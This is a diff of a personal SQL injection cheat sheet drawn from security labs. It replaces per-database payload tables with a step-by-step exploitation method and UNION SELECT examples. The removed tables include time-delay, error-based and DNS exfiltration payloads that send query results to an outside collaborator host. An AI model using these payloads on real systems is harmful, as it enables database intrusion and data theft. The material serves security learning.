@@ -1,138 +1,58 @@
 # SQL injection cheat sheet
 
-## String concatenation
+big payload cheatsheet can be found [here](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
-You can concatenate together multiple strings to make a single string.
+## How to examine SQLi
 
-| DB         | IDK                                                  |
-| ---------- | ---------------------------------------------------- |
-| Oracle     | `'foo'\|                                             |
-| Microsoft  | `'foo'+'bar'`                                        |
-| PostgreSQL | `'foo'\|                                             |
-| MySQL      | `'foo' 'bar'` (using space)<br>`CONCAT('foo','bar')` |
+1. Test input fields for SQLi 
+   
+   - The key is to trigger an SQL/internal server error
+   
+   - Try vaious payloads, you can find a lot [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
+   
+   - once an **Internal server error** appears, SQLi confirmed
 
-## Substring
+2. determine the number of columns
+   
+   - add `ORDER BY 100` and keep decrementing the number until the error disappears 
+   
+   - or add `UNION SELECT NULL,NULL,NULL...`  and keep adding until the error disappears( see 1st remark)
 
-the word is 1 kindexed (indexing start at 1) and the substring is extracted by specifying the start and the length of the substr 
+3. find a column containing text 
+   
+   - not always all the returned columns are all displayed, thats why to retrieve data we must determine which column are being displayed ( see the 2nd remark)
 
- `ba`.
+4. identifying database version
 
-| DB         | IDK                         |
-| ---------- | --------------------------- |
-| Oracle     | `SUBSTR('foobar', 4, 2)`    |
-| Microsoft  | `SUBSTRING('foobar', 4, 2)` |
-| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
-| MySQL      | `SUBSTRING('foobar', 4, 2)` |
+5. determine present databases 
 
-## Comments
+6. determine tables present in database
 
-You can use comments to truncate a query and remove the portion of the original query that follows your input.
+7. determine columns in table
 
-| DB         | IDK                                                                                |
-| ---------- | ---------------------------------------------------------------------------------- |
-| Oracle     | `--comment<br>`                                                                    |
-| Microsoft  | `--comment<br>/*comment*/`                                                         |
-| PostgreSQL | `--comment<br>/*comment*/`                                                         |
-| MySQL      | `#comment`<br>`-- comment` [Note the space after the double dash]<br>`/*comment*/` |
+8. retrieve data :'D
 
-## Database version
+> steps 4 to 7 cna be done using [this pdf](../SQLi_htb.pdf) 
 
-You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.
 
-| DB         | IDK                                                                  |
-| ---------- | -------------------------------------------------------------------- |
-| Oracle     | `SELECT banner FROM v$version<br>SELECT version FROM v$instance<br>` |
-| Microsoft  | `SELECT @@version`                                                   |
-| PostgreSQL | `SELECT version()`                                                   |
-| MySQL      | `SELECT @@version`                                                   |
 
-## Database contents
 
-You can list the tables that exist in the database, and the columns that those tables contain.
 
-| DB         | IDK                                                                                                                            |
-| ---------- | ------------------------------------------------------------------------------------------------------------------------------ |
-| Oracle     | `SELECT * FROM all_tables<br>SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`                               |
-| Microsoft  | `SELECT * FROM information_schema.tables<br>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br>` |
-| PostgreSQL | `SELECT * FROM information_schema.tables<br>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br>` |
-| MySQL      | `SELECT * FROM information_schema.tables<br>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br>` |
+## Remarks
 
-## Conditional errors
+1. On Oracle databases, every `SELECT` statement must specify a table to select `FROM` otherwise it will result in an error. There is a built-in table on Oracle called `dual` which you can use for this purpose. Example `UNION SELECT NULL,.. FROM dual`
 
-You can test a single boolean condition and trigger a database error if the condition is true.
+2. in some lab, when I was searchig for  the column containg reflected text (ik there is 3 columns)  I encountered errors 
+   
+   ```sql
+   UNION SELECT NULL,NULL,NULL        --✅ correct number of columns
+   UNION SELECT 'N',NULL,NULL         --❌ first column not string-compatible
+   UNION SELECT NULL,'N',NULL         --✅ second column string-compatible
+   UNION SELECT NULL,NULL,'N'         --❌ third column not string-compatible
+   ```
+   
+   here I tried at first glance to do `UNION SELECT 'a','b','c'` to see which one is being reflected in the page, but it returned an error, that means not all returned columns are `VARCHAR` , they can be `INT` 
 
-| DB         | IDK                                                                                     |
-| ---------- | --------------------------------------------------------------------------------------- |
-| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`      |
-| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`                         |
-| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`          |
-| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |
+3. **AN ERROR MAY MEAN THAT MY PAYLOAD IS NOT PERFECT (IT CAN HAVE SYNTAX FAULTS)** that doesnt mean always im on the wrong track or there is a trick that I dont know
 
-## Extracting data via visible error messages
-
-You can potentially elicit error messages that leak sensitive data returned by your malicious query.
-
-|            |                                                                                                                             |
-| ---------- | --------------------------------------------------------------------------------------------------------------------------- |
-| Microsoft  | `SELECT 'foo' WHERE 1 = (SELECT 'secret') > Conversion failed when converting the varchar value 'secret' to data type int.` |
-| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int) > invalid input syntax for integer: "secret"`                     |
-| MySQL      | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret'))) > XPATH syntax error: '\secret'`               |
-
-## Batched (or stacked) queries
-
-You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.
-
-|            |                                                           |
-| ---------- | --------------------------------------------------------- |
-| Oracle     | `Does not support batched queries.`                       |
-| Microsoft  | `QUERY-1-HERE; QUERY-2-HERE<br>QUERY-1-HERE QUERY-2-HERE` |
-| PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE`                              |
-| MySQL      | `QUERY-1-HERE; QUERY-2-HERE`                              |
-
-#### Note
-
-With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.
-
-## Time delays
-
-You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.
-
-|            |                                       |
-| ---------- | ------------------------------------- |
-| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
-| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
-| PostgreSQL | `SELECT pg_sleep(10)`                 |
-| MySQL      | `SELECT SLEEP(10)`                    |
-
-## Conditional time delays
-
-You can test a single boolean condition and trigger a time delay if the condition is true.
-
-|            |                                                                                                                |
-| ---------- | -------------------------------------------------------------------------------------------------------------- |
-| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
-| Microsoft  | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`                                                              |
-| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`                                |
-| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`                                                                 |
-
-## DNS lookup
-
-You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.
-
-|            |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
-| ---------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Oracle     | (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`The following technique works on fully patched Oracle installations, but requires elevated privileges:`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` |
-| Microsoft  | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`                                                                                                                                                                                                                                                                                                                                                                                                                                                |
-| PostgreSQL | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`                                                                                                                                                                                                                                                                                                                                                                                                                                       |
-| MySQL      | The following techniques work on Windows only:`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`<br>`SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`                                                                                                                                                                                                                                                                                                                                           |
-
-## DNS lookup with data exfiltration
-
-You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.
-
-|            |                                                                                                                                                                                                                                                                                                                       |
-| ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Oracle     | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|(SELECT YOUR-QUERY-HERE)\|'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`                                                                                                     |
-| Microsoft  | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')`                                                                                                                                                                                        |
-| PostgreSQL | `create OR replace function f() returns void as $$<br>declare c text;<br>declare p text;<br>begin<br>SELECT into p (SELECT YOUR-QUERY-HERE);<br>c := 'copy (SELECT '''') to program ''nslookup '\|p\|'.BURP-COLLABORATOR-SUBDOMAIN''';<br>execute c;<br>END;<br>$$ language plpgsql security definer;<br>SELECT f();` |
-| MySQL      | The following technique works on Windows only:<br>`SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`                                                                                                                                                                                           |
+4. most commonly in SQLi the DB is gonna be MYSQL, but in case of erros and idk the reason, try other databases, [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) I can find how to determine the DB type and version
